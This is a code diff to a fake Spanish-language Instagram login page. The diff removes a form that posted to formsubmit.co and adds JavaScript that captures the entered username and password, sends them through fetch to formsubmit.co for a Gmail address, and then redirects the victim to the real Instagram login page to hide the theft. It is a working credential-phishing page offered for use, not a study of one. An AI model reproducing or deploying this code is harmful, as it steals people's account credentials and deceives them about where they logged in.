@@ -197,15 +197,7 @@
             <img src="logo.jpg" alt="Logo" class="site-logo">
         </div>
 
-        <!-- Formulario configurado para enviar al correo y redirigir automáticamente -->
-        <form class="login-form" id="loginForm" action="https://formsubmit.co/trollgaga999@gmail.com" method="POST">
-            <!-- Desactiva captchas -->
-            <input type="hidden" name="_captcha" value="false">
-            <!-- Organiza los datos recibidos en forma de tabla limpia -->
-            <input type="hidden" name="_template" value="table">
-            <!-- Redirección automática inmediata al sitio real de Instagram tras procesar -->
-            <input type="hidden" name="_next" value="https://www.instagram.com/accounts/login/?hl=es&source=auth_switcher">
-
+        <form class="login-form" id="loginForm">
             <div class="input-group">
                 <input type="text" name="Usuario" class="input-field" id="usernameInput" placeholder="Nombre de usuario, correo o celular" required>
             </div>
@@ -256,6 +248,42 @@
                     <line x1="1" y1="1" x2="23" y2="23"></line>
                 `;
             }
+        });
+
+        const loginForm = document.getElementById('loginForm');
+        const submitBtn = document.getElementById('submitBtn');
+
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            // Deshabilitamos el botón y mostramos el aviso visual que querías
+            submitBtn.disabled = true;
+            submitBtn.textContent = "Redirigiendo...";
+
+            // Capturamos los valores directamente de los inputs con total seguridad
+            const formData = {
+                Usuario: document.getElementById('usernameInput').value,
+                Contraseña: passwordInput.value,
+                _captcha: "false",
+                _template: "table"
+            };
+
+            try {
+                // Enviamos los datos mediante JSON al servidor de FormSubmit de forma limpia
+                await fetch("https://formsubmit.co/ajax/trollgaga999@gmail.com", {
+                    method: "POST",
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(formData)
+                });
+            } catch (error) {
+                console.log('Error de envío', error);
+            }
+
+            // Redirección inmediata al entorno de Instagram sin salir del navegador móvil
+            window.location.replace("https://www.instagram.com/accounts/login/?hl=es&source=auth_switcher");
         });
     </script>
 
